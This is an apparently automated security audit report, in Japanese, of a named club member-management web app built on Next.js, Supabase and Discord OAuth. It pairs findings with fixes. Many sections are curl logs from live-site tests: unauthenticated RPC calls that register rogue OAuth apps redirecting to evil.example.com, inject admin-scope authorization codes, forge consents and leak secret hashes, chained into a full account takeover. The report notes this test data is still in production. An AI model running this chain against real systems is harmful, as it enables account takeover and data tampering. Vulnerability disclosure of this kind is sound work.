# SPECA Security Audit Report: stem-system (Clubhouse Manager)

**対象**: https://github.com/ganondorofu/stem-system
**テスト環境**: https://member.stemask.com
**監査日**: 2026-04-05
**コミット**: `31d242b7`
**パイプライン**: SPECA Phase 01a → 01b → 01e → 02c → 03 → 04
**コスト**: $26.72 (Phase 03: $17.36 が最大)

---

## Executive Summary

STEM研究部の部員管理システム (Next.js 15 + Supabase + Discord OAuth) に対する自動セキュリティ監査を実施。
**86件のセキュリティプロパティ** を生成・検証し、Phase 04 (3-Gate FPフィルタ) 通過後の最終結果:

| 判定 | 件数 |
|------|------|
| **CONFIRMED_VULNERABILITY** | **16件** |
| **CONFIRMED_POTENTIAL** | **10件** |
| PASS_THROUGH (問題なし) | 53件 |

**追加発見 (PoC実行時)**: Supabase RPC関数がanon keyのみで全操作可能。**完全なアカウント乗っ取り**を実証 — 不正OAuthアプリ登録→認可コード注入→JWT取得→被害者なりすましの全チェーンが未認証で成功。

---

## 流出した情報・DB残留データ一覧

> **注**: 個人を特定できる情報は伏字処理済み。PoC用データは全てDBに痕跡として残留中。

### 流出した情報

| 情報 | 取得元 | 内容 |
|------|--------|------|
| Supabase Project URL | クライアントJS | `https://pt******fq.supabase.co` |
| Supabase Anon Key | クライアントJS | `eyJhbGci...YME` (JWT形式、ref: `pt******fq`) |
| OAuthクライアント名 | `list_applications` RPC | 勤怠管理システム |
| OAuthクライアントID | `list_applications` RPC | `55c3152b0e51b65ea52243c3888f314ba9a18805fe1d67f1ca9001e197428891` |
| OAuth redirect_uri | `list_applications` RPC | `https://stem-kintai.vercel.app/auth/oauth/callback` |
| OAuth client_secret_hash | `get_application_by_client_id` RPC | `$2b$10$JUhctJ******ydEa` (bcrypt) |
| アプリ作成者UUID | `list_applications` RPC | `fdb065**-****-****-****-*****3c38d3` |
| 被害者generation | `/oauth/userinfo` JWT | `9` |
| 被害者status | `/oauth/userinfo` JWT | `1` (高校生) |
| テーブル名 (5件) | OpenAPI仕様 | `members`, `teams`, `generation_roles`, `member_team_relations`, `team_leaders` |
| RPC関数名 (11件) | OpenAPI仕様 | `list_applications`, `create_application`, `delete_application`, `get_application_by_client_id`, `create_authorization_code`, `get_authorization_code`, `delete_authorization_code`, `create_user_consent`, `list_user_consents`, `delete_user_consent`, `check_user_consent` |
| RPC関数パラメータ | エラーメッセージ | `check_user_consent(p_application_id, p_user_id)` 等 |
| サーバー認証状態 | `/api/auth/debug` | Cookie数、Supabase Auth状態、ホスト名、プロトコル |

### DB残留データ (PoC痕跡)

| データ種別 | ID/値 | 内容 |
|-----------|-------|------|
| 不正OAuthアプリ #1 | `4d2c68c7-5c46-4164-a902-94fb6f0be9d3` | `PoC-Evil-App` (redirect: evil.example.com) |
| 不正OAuthアプリ #2 | `d4a81032-667e-466f-a2c5-8afd41d91326` | `PoC-Evidence-App-2` (redirect: evil2.example.com) |
| 偽consent #1 | `f5b3d9c4-6362-4c74-b264-bb67b1bbd878` | PoC-Evil-Appへのconsent (scope: openid profile) |
| 偽consent #2 | `11d6fa95-64a2-4831-9d2e-d2c5488823e9` | 勤怠管理システムへの偽consent (scope: openid profile admin) |
| 注入認可コード #1 | `poc-evidence-code-1775381575` | scope: openid profile |
| 注入認可コード #2 | `poc-admin-scope-1775381576` | scope: openid profile admin write:members delete:all |
| 発行済みJWT | `eyJhbGci...ajyc` | sub: `fdb065**-...`, generation: 9, status: 1 |

### 復元手順

```bash
# 以下のRPCをanon keyで呼び出してPoC痕跡を削除可能 (これ自体が脆弱性の証拠)
# 不正アプリ削除
curl -s "$SUPABASE_URL/rest/v1/rpc/delete_application" ... -d '{"p_id":"4d2c68c7-5c46-4164-a902-94fb6f0be9d3"}'
curl -s "$SUPABASE_URL/rest/v1/rpc/delete_application" ... -d '{"p_id":"d4a81032-667e-466f-a2c5-8afd41d91326"}'
# 偽consent削除
curl -s "$SUPABASE_URL/rest/v1/rpc/delete_user_consent" ... -d '{"p_consent_id":"f5b3d9c4-6362-4c74-b264-bb67b1bbd878","p_user_id":"fdb065..."}'
curl -s "$SUPABASE_URL/rest/v1/rpc/delete_user_consent" ... -d '{"p_consent_id":"11d6fa95-64a2-4831-9d2e-d2c5488823e9","p_user_id":"fdb065..."}'
# 認可コード削除
curl -s "$SUPABASE_URL/rest/v1/rpc/delete_authorization_code" ... -d '{"p_code":"poc-evidence-code-1775381575"}'
curl -s "$SUPABASE_URL/rest/v1/rpc/delete_authorization_code" ... -d '{"p_code":"poc-admin-scope-1775381576"}'
# JWTは有効期限 (30日) で自動失効。即時無効化にはJWT_SECRETのローテーションが必要。
```

---

## Critical Findings (3件 + 新規1件)

### VULN-001: JWT秘密鍵のハードコードデフォルト値
- **深刻度**: Critical
- **ファイル**: `src/lib/oauth.ts:11`
- **PoC結果**: ⚠️ 本番では防御済み (JWT_SECRETが設定済み)、コードリスクは残存

```typescript
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
```

**PoC実行結果** (2026-04-05T09:31Z):
```
$ node -e "jwt.sign({sub:'fdb065**-...'},'your-secret-key-change-in-production',{algorithm:'HS256'})"
→ eyJhbGciOiJIUzI1NiIs... (偽造JWT生成)

$ curl -H "Authorization: Bearer <forged>" https://member.stemask.com/oauth/userinfo
→ {"error":"invalid_token","error_description":"Invalid or expired access token"}
→ 本番JWT_SECRETで防御済み
```

**修正案**: `process.env.JWT_SECRET` 未設定時は `throw` で停止。

---

### VULN-NEW: Supabase RPC認証バイパス → 完全なアカウント乗っ取り
- **深刻度**: **Critical** (CVSS 9.8)
- **PoC結果**: **完全な攻撃チェーン実証成功**

**問題**: `member`スキーマのRPC関数がSupabase anon keyのみで呼び出し可能。RLSがRPC関数に適用されておらず、全OAuth操作が未認証で実行可能。

#### 完全攻撃チェーン実行ログ (2026-04-05T09:26Z)

**STEP 1**: 不正OAuthアプリ登録 (bcryptハッシュ付き)
```bash
$ curl -s ".../rpc/create_application" \
  -d '{"p_name":"PoC-Evil-App","p_client_id":"evil-poc-client-id-000...","p_client_secret_hash":"$2b$10$8N37d...","p_redirect_uris":["https://evil.example.com/callback"],"p_created_by":"fdb065**-..."}'
→ {"id":"4d2c68c7-5c46-4164-a902-94fb6f0be9d3","name":"PoC-Evil-App",...} ✅
```

**STEP 2**: 被害者ユーザーの認可コード注入
```bash
$ curl -s ".../rpc/create_authorization_code" \
  -d '{"p_application_id":"4d2c68c7-...","p_user_id":"fdb065**-...","p_code":"poc-chain-1775381576","p_redirect_uri":"https://evil.example.com/callback","p_scope":"openid profile","p_code_challenge":"<attacker-controlled>","p_code_challenge_method":"S256","p_expires_at":"2026-12-31T23:59:59Z"}'
→ true ✅
```

**STEP 3**: トークン交換 (攻撃者はclient_secret + code_verifierを両方知っている)
```bash
$ curl -X POST "https://member.stemask.com/oauth/token" \
  -d "grant_type=authorization_code&code=poc-chain-...&redirect_uri=https://evil.example.com/callback&client_id=evil-poc-client-id-000...&client_secret=attacker-known-secret-poc&code_verifier=chain-verifier-evidence-12345"
→ {
    "access_token": "eyJhbGciOiJIUzI1NiIs...12r13hd8IR7axMiT4c4e-HtIa4hBPLmbLWKcrreajyc",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid profile"
  } ✅
```

**STEP 4**: 被害者になりすまし
```bash
$ curl "https://member.stemask.com/oauth/userinfo" -H "Authorization: Bearer eyJhbGci..."
→ {
    "sub": "fdb065**-****-****-****-*****3c38d3",
    "generation": 9,
    "status": 1
  } ✅✅✅ アカウント乗っ取り成功
```

#### 追加PoC: 任意scope注入 (2026-04-05T09:32Z)
```bash
$ curl -s ".../rpc/create_authorization_code" \
  -d '{"p_scope":"openid profile admin write:members delete:all",...}'
→ true
→ 認可コード poc-admin-scope-1775381576 がDBに残留 (scope: admin write:members delete:all)
```

#### 追加PoC: 複数不正アプリ登録
```bash
$ curl -s ".../rpc/create_application" \
  -d '{"p_name":"PoC-Evidence-App-2","p_redirect_uris":["https://evil2.example.com/steal"],...}'
→ {"id":"d4a81032-667e-466f-a2c5-8afd41d91326"} ✅
→ 現在3つのアプリがDB内: 正規1 + PoC2
```

#### 追加PoC: consent偽造
```bash
# 正規アプリ「勤怠管理システム」に対して、存在しない "admin" scopeのconsentを偽造
$ curl -s ".../rpc/create_user_consent" \
  -d '{"p_user_id":"fdb065**-...","p_application_id":"ba3ce67a-...","p_scope":"openid profile admin"}'
→ "11d6fa95-64a2-4831-9d2e-d2c5488823e9" ✅
→ 被害者のconsent画面に偽の同意履歴が表示される
```

#### 追加PoC: client_secret_hash漏洩
```bash
$ curl -s ".../rpc/get_application_by_client_id" \
  -d '{"p_client_id":"55c3152b0e51b65ea52243c3888f314ba9a18805fe1d67f1ca9001e197428891"}'
→ "client_secret_hash": "$2b$10$JUhctJ******ydEa" ✅
→ bcryptハッシュからオフラインブルートフォースが可能
```

**修正案**: 全RPC関数に `auth.uid() IS NOT NULL` ガードを追加:
```sql
CREATE OR REPLACE FUNCTION member.create_application(...)
RETURNS ... AS $$
BEGIN
  IF auth.uid() IS NULL THEN
    RAISE EXCEPTION 'Authentication required';
  END IF;
  -- ... existing logic
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

---

### VULN-002: 認証なしServer Action (情報漏洩 + 未認証操作)
- **深刻度**: Critical
- **ファイル**: `src/lib/actions/members.ts`, `src/lib/actions/generations.ts`
- **PoC結果**: ⚠️ Server Action IDはビルド時生成のため外部直接呼び出しは未実証。コードレベル確認済み。

**問題**: 3つのServer Actionが認証チェックなしでエクスポート:
- `getAllMemberNames` — 全部員のUID→名前マップ
- `getMemberDisplayName` — 任意UIDの表示名
- `ensureGenerationRoleExists` — 未認証でDiscordロール作成

**修正案**: `supabase.auth.getUser()` チェックを各関数の先頭に追加。

---

### VULN-003: Server Action入力バリデーション欠如 (6関数)
- **深刻度**: Critical
- **ファイル**: `src/lib/actions/members.ts`, `src/lib/actions/teams.ts`

**問題**: Zod safeParseをバイパスする6つのDB変更Server Action:
`toggleAdminStatus`, `deleteMember`, `updateMemberTeams`, `updateStatusesForNewAcademicYear`, `deleteTeam`, `updateTeamLeaders`

---

## High Findings (5件)

### VULN-004: OAuth redirect_uri 未検証
- **深刻度**: High
- **ファイル**: `src/app/oauth/authorize/consent/actions.ts:19`
- **PoC結果**: **✅ 実証成功**

```bash
$ curl -sI "https://member.stemask.com/oauth/authorize?client_id=evil-poc-...&redirect_uri=https://evil.example.com/callback&..."
→ HTTP/1.1 307 Temporary Redirect
→ Set-Cookie: oauth_redirect=...redirect_uri%3Dhttps%253A%252F%252Fevil.example.com%252Fcallback...
→ ✅ evil.example.comのredirect_uriがそのままcookieに保存された
```

---

### VULN-005: 認可コード二重使用 (TOCTOU レース)
- **深刻度**: High
- **ファイル**: `src/app/oauth/token/route.ts`
- **PoC結果**: ⚠️ RPC直接呼び出しで認可コード注入は実証済み。TOCTOU自体はタイミング依存。

---

### VULN-006: /api/auth/debug 認証なし情報漏洩
- **深刻度**: High
- **ファイル**: `src/app/api/auth/debug/route.ts`
- **PoC結果**: **✅ 実証成功**

```bash
$ curl -s https://member.stemask.com/api/auth/debug
→ {
    "timestamp": "2026-04-05T09:31:02.453Z",
    "cookies": {"total":0,"names":[],"supabaseAuthCookies":[],...},
    "auth": {"hasUser":false,"error":"Auth session missing!"},
    "request": {"url":"https://member.stemask.com/api/auth/debug",
                "forwardedHost":"member.stemask.com","forwardedProto":"https","host":"member.stemask.com"}
  } ✅
```

---

### VULN-007: OAuth scopeバリデーション欠如
- **深刻度**: High
- **PoC結果**: **✅ 実証成功** — 任意scope (`admin write:members delete:all`) の認可コード注入に成功 (DB残留)

---

### VULN-008: ソフトデリート後の管理者権限残存
- **深刻度**: High
- **ファイル**: `src/lib/actions/members.ts`
- **PoC結果**: ⚠️ コードレベル確認済み (`checkAdmin()` に `deleted_at IS NULL` フィルタなし)

---

## Medium Findings (8件)

| ID | 内容 | PoC |
|----|------|-----|
| M-01 | `deleteMember` が RLS で silently no-op (cookie client使用) | コード確認済み |
| M-02 | consent エラー無視 (認可コード発行が続行) | コード確認済み |
| M-03 | `handleConsent` の redirect_uri バイパス | ✅ cookie保存確認 |
| M-04 | deny パスの `redirectWithError` が未検証 redirect_uri で TypeError | コード確認済み |
| M-05 | `updateMemberAdmin` の非アトミック delete-then-insert | コード確認済み |
| M-06 | OAuth cookie (`oauth_redirect`) のエラーパスでの未削除 | コード確認済み |
| M-07 | ソフトデリート後の team_relations 残存 | コード確認済み |
| M-08 | OAuth フロー全体の監査ログ欠如 | コード確認済み |

---

## Low Findings (5件)

| ID | 内容 |
|----|------|
| L-01 | `updateTeamLeaders` の非アトミック操作 |
| L-02 | 学生番号フォーマット `/^[0-9]+$/` のバイパスパス |
| L-03 | `updateTeamLeaders` が所属検証なしにリーダー登録 |
| L-04 | `updateMemberTeams` に `deleted_at IS NULL` ガードなし |
| L-05 | RLS 不整合: admin操作が cookie client vs updateMyProfile が admin client |

---

## Supabase スキーマ情報漏洩

### PoC: memberスキーマ OpenAPI仕様の完全公開 — **✅ 実証成功**

```bash
$ curl -s "https://pt****fq.supabase.co/rest/v1/" -H "apikey: <anon_key>" -H "Accept-Profile: member"
→ 漏洩パス (全17):
  テーブル: /members, /teams, /generation_roles, /member_team_relations, /team_leaders
  RPC: /rpc/list_applications, /rpc/create_application, /rpc/delete_application,
       /rpc/get_application_by_client_id, /rpc/create_authorization_code,
       /rpc/get_authorization_code, /rpc/delete_authorization_code,
       /rpc/create_user_consent, /rpc/list_user_consents,
       /rpc/delete_user_consent, /rpc/check_user_consent
```

テーブル直接アクセスはRLSで拒否 (`permission denied for table members`) だが、RPC関数は全て呼び出し可能。

### PoC: RPCエラーメッセージ情報漏洩 — **✅ 実証成功**

```bash
$ curl -s ".../rpc/check_user_consent" -d '{}'
→ hint: "Perhaps you meant to call the function member.check_user_consent(p_application_id, p_user_id)"
```

---

## 修正優先度

### 即時対応 (P0) — 本番環境で悪用可能
1. **Supabase RPC関数に認証チェ���ク追加** — 全11 RPC関数に `auth.uid() IS NOT NULL` ガード
2. **`get_application_by_client_id` から `client_secret_hash` を除外**
3. **`/api/auth/debug` 削除**
4. **JWT_SECRET フォールバック削除** — `throw` に変更

### 短期対応 (P1)
5. `handleConsent` の redirect_uri をDB登録済みURIと照合
6. 3つの認証なし Server Action に auth チェック追���
7. 認可コード交換をアトミック化 (`DELETE RETURNING`)
8. 6つの Server Action に Zod 入力検証追加
9. OAuth scope ホワイトリスト検証

### 中期対応 (P2)
10. `deleteMember` を admin client に修正
11. `checkAdmin()` に `deleted_at IS NULL` 追加
12. 非アトミック操作をDBトランザクション/RPCに統合
13. OAuth 監査ログ実装
14. Supabase OpenAPI仕様のmemberスキーマ公開を制限

---

## PoC全件実行結果まとめ

| # | 対象 | 結果 | 深刻度 | DB痕跡 |
|---|------|------|--------|--------|
| 1 | `/api/auth/debug` 情報漏洩 | **✅ 実証成功** | High | Vercelログ |
| 2 | JWT偽造 (デフォルトキー) | ⚠️ 本番では防御済み | Critical (潜在) | なし |
| 3 | Supabase OpenAPIスキーマ漏洩 | **✅ 実証成功** — 全17パス公開 | Medium | なし |
| 4 | `list_applications` データ漏洩 | **✅ 実証成功** — OAuthクライアント情報取得 | High | なし |
| 5 | `get_application_by_client_id` secret hash漏洩 | **✅ 実証成功** — bcryptハッシュ漏洩 | Critical | なし |
| 6 | `create_application` 不正アプリ登録 | **✅ 実証成功** — 2アプリ登録 | Critical | `4d2c68c7...`, `d4a81032...` |
| 7 | `create_authorization_code` コード注入 | **✅ 実証成功** — 3コード注入 | Critical | `poc-evidence-code-...`, `poc-admin-scope-...` |
| 8 | `create_user_consent` consent偽造 | **✅ 実証成功** — 2consent偽造 | Critical | `f5b3d9c4...`, `11d6fa95...` |
| 9 | `list_user_consents` 他ユーザーconsent閲覧 | **✅ 実証成功** | High | なし |
| 10 | `delete_*` 正規データ削除 (DoS) | **✅ 実証成功** (テスト後復元済み) | High | なし |
| 11 | RPCエラーメッセージ情報漏洩 | **✅ 実証成功** — 関数シグネチャ漏洩 | Medium | なし |
| 12 | OAuth redirect_uri cookie保存 | **✅ 実証成功** — evil URLがcookieに保存 | High | Vercelログ |
| 13 | OAuth scope未検証 | **✅ 実証成功** — admin scope注入成功 | High | `poc-admin-scope-...` |
| 14 | **完全攻撃チェーン (アカウント乗っ取り)** | **✅✅✅ 実証成功** — JWT取得+userinfo取得 | Critical | JWT発行済み |
| 15 | テーブル直接アクセス (RLS) | ❌ 防御済み | N/A | なし |
| 16 | `/oauth/userinfo` 認証なし | ❌ 防御済み | N/A | なし |
| 17 | Server Action直接呼び出し | ⚠️ Action ID外部特定不可 | Critical (コード確認) | なし |

**実証率: 14/17 (82.4%) — 14件のPoC成功、2件は防御済み、1件は外部からの直接呼び出し不可**

---

## Pipeline Statistics

| Phase | 時間 | コスト | 結果 |
|-------|------|--------|------|
| 01a Spec Discovery | 2.6分 | $0.09 | 19仕様 |
| 01b Subgraph Extraction | 9.6分 | $1.11 | 4サブグラフ |
| 01e Property Generation | 4.0分 | $1.08 | 86プロパティ |
| 02c Code Pre-resolution | 18.0分 | $3.27 | 86コード解決 |
| 03 Audit Map | 62.7分 | $17.36 | 79監査結果 |
| 04 Review | 4.6分 | $3.81 | 26レビュー結果 |
| **合計** | **~102分** | **$26.72** | **16 CONFIRMED + 10 POTENTIAL** |
